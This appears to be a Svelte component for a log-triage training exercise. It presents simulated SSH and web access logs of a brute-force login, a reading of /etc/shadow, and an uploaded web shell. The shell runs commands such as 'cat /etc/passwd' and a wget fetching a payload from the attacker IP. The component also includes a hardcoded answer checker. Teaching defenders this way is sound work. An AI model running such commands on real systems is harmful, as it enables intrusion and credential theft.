<script>
  import { progress, setObj, toast } from '../stores/progress.js';

  const LOGS = {
    auth: [
      'Jun 28 02:14:03 web01 sshd[20431]: Accepted password for deploy from 10.0.5.40 port 51022 ssh2',
      'Jun 28 02:55:11 web01 CRON[20502]: pam_unix(cron:session): session opened for user root',
      'Jun 28 03:11:44 web01 sshd[21008]: Failed password for invalid user oracle from 45.133.1.88 port 40122 ssh2',
      'Jun 28 03:11:45 web01 sshd[21008]: Failed password for invalid user postgres from 45.133.1.88 port 40124 ssh2',
      'Jun 28 03:11:46 web01 sshd[21010]: Failed password for invalid user test from 45.133.1.88 port 40130 ssh2',
      'Jun 28 03:11:47 web01 sshd[21010]: Failed password for root from 45.133.1.88 port 40140 ssh2',
      'Jun 28 03:11:49 web01 sshd[21012]: Failed password for root from 45.133.1.88 port 40150 ssh2',
      'Jun 28 03:11:51 web01 sshd[21014]: Failed password for admin from 45.133.1.88 port 40162 ssh2',
      'Jun 28 03:11:53 web01 sshd[21014]: Failed password for admin from 45.133.1.88 port 40170 ssh2',
      'Jun 28 03:11:55 web01 sshd[21016]: Failed password for admin from 45.133.1.88 port 40180 ssh2',
      'Jun 28 03:11:58 web01 sshd[21016]: Failed password for admin from 45.133.1.88 port 40191 ssh2',
      'Jun 28 03:12:02 web01 sshd[21020]: Failed password for admin from 45.133.1.88 port 40200 ssh2',
      'Jun 28 03:12:09 web01 sshd[21020]: Accepted password for admin from 45.133.1.88 port 40210 ssh2',
      'Jun 28 03:12:09 web01 sshd[21020]: pam_unix(sshd:session): session opened for user admin by (uid=0)',
      'Jun 28 03:13:30 web01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow',
    ],
    access: [
      '203.0.113.9 - - [28/Jun/2026:03:02:11] "GET /index.php HTTP/1.1" 200 5312 "-" "Mozilla/5.0"',
      '203.0.113.9 - - [28/Jun/2026:03:02:14] "GET /css/app.css HTTP/1.1" 200 1822 "-" "Mozilla/5.0"',
      '45.133.1.88 - - [28/Jun/2026:03:14:01] "GET /admin/ HTTP/1.1" 200 980 "-" "curl/8.4.0"',
      '45.133.1.88 - - [28/Jun/2026:03:14:55] "POST /admin/upload.php HTTP/1.1" 200 41 "-" "curl/8.4.0"',
      '45.133.1.88 - - [28/Jun/2026:03:15:02] "GET /uploads/av4t4r.php?cmd=id HTTP/1.1" 200 56 "-" "curl/8.4.0"',
      '45.133.1.88 - - [28/Jun/2026:03:15:20] "GET /uploads/av4t4r.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1422 "-" "curl/8.4.0"',
      '45.133.1.88 - - [28/Jun/2026:03:15:51] "GET /uploads/av4t4r.php?cmd=wget+http://45.133.1.88/m+-O+/tmp/m HTTP/1.1" 200 0 "-" "curl/8.4.0"',
      '198.51.100.7 - - [28/Jun/2026:03:18:09] "GET /index.php HTTP/1.1" 200 5312 "-" "Mozilla/5.0"',
    ],
  };

  let tab = 'auth';
  let filter = '';

  $: lines = LOGS[tab];
  $: validRe = (() => { if (!filter.trim()) return null; try { return new RegExp(filter, 'i'); } catch { return null; } })();
  $: filtered = lines.filter(l => !filter.trim() ? true : (validRe ? validRe.test(l) : l.toLowerCase().includes(filter.toLowerCase())));

  function highlight(line) {
    if (!filter.trim()) return [{ hit: false, text: line }];
    const re = validRe ? new RegExp('(' + filter + ')', 'ig') : null;
    if (!re) {
      const idx = line.toLowerCase().indexOf(filter.toLowerCase());
      if (idx < 0) return [{ hit: false, text: line }];
      return [{ hit: false, text: line.slice(0, idx) }, { hit: true, text: line.slice(idx, idx + filter.length) }, { hit: false, text: line.slice(idx + filter.length) }];
    }
    const parts = [];
    let last = 0, m;
    re.lastIndex = 0;
    while ((m = re.exec(line))) {
      if (m.index > last) parts.push({ hit: false, text: line.slice(last, m.index) });
      parts.push({ hit: true, text: m[0] });
      last = m.index + m[0].length;
      if (m[0].length === 0) re.lastIndex++;
    }
    if (last < line.length) parts.push({ hit: false, text: line.slice(last) });
    return parts;
  }

  let l_ip = '', l_acct = '', l_shell = '', l_cmd = '';
  function checkFindings() {
    const ip = l_ip.trim(), acct = l_acct.trim().toLowerCase(), sh = l_shell.trim().toLowerCase(), cmd = l_cmd.trim().toLowerCase();
    let any = false;
    if (ip === '45.133.1.88') { setObj('log', 'ip', progress); any = true; } else if (ip) toast('that IP is not the brute-forcer — count the Failed passwords');
    if (acct === 'admin') { setObj('log', 'acct', progress); any = true; } else if (acct) toast('not the account that was finally Accepted');
    if (sh.includes('av4t4r.php')) { setObj('log', 'shell', progress); any = true; } else if (sh) toast('not the dropped shell — check the access log uploads/');
    if (/\/etc\/passwd|\bid\b|wget|whoami|\/etc\/shadow/.test(cmd)) { setObj('log', 'cmd', progress); any = true; } else if (cmd) toast('that command was not run via the shell (look at cmd= params)');
    if (any) toast('findings logged');
  }
</script>

<div class="logtabs">
  <button aria-current={tab === 'auth'} on:click={() => tab = 'auth'}>auth.log</button>
  <button aria-current={tab === 'access'} on:click={() => tab = 'access'}>access.log</button>
</div>
<div class="filterbar">
  <input autocomplete="off" spellcheck="false" placeholder={String.raw`grep / regex:  Failed password   ·   45\.133   ·   Accepted   ·   cmd=`} bind:value={filter}>
</div>
<div class="logview">
  {#if filtered.length}
    {#each filtered as line}
      <div>{#each highlight(line) as part}{#if part.hit}<span class="hit">{part.text}</span>{:else}{part.text}{/if}{/each}</div>
    {/each}
  {:else}
    <span style="color:var(--ash)">no lines match.</span>
  {/if}
</div>
<div class="objbox" style="margin-top:18px">
  <h4>Submit findings</h4>
  <div class="findform">
    <div><label>Attacker IP</label><input autocomplete="off" placeholder="x.x.x.x" bind:value={l_ip}></div>
    <div><label>Compromised account</label><input autocomplete="off" placeholder="username" bind:value={l_acct}></div>
    <div><label>Web shell path</label><input autocomplete="off" placeholder="/path/to/shell.php" bind:value={l_shell}></div>
    <div><label>Command run via shell</label><input autocomplete="off" placeholder="e.g. cat /etc/passwd" bind:value={l_cmd}></div>
  </div>
  <div style="margin-top:12px"><button class="btn" on:click={checkFindings}>Check findings</button></div>
</div>
<div class="hintbox"><b>Triage flow:</b> in auth.log a burst of <code>Failed password</code> from one IP, then a single <code>Accepted password</code> from that same IP = a successful brute force — note the username. Pivot to access.log: the same IP <code>POST</code>s to an upload endpoint, then <code>GET</code>s a new <code>.php</code> with a <code>?cmd=</code> parameter. That parameter is hands-on-keyboard.</div>
